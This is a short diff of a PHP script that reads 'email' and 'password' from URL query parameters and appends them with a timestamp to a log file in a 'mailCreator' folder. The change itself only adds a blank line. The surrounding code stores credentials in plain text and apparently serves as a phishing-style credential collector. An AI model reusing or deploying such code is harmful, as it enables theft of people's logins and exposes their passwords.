@@ -8,4 +8,5 @@ $fp = fopen('/home/content/23/11330723/html/app/mailCreator/log.txt','a+');
 $msg = 'username: ' . $_GET['email'] . ' | password: ' . $_GET['password'];
 fwrite($fp, $msg . ' | '  . $date . PHP_EOL);
 fclose($fp);
+
 ?>
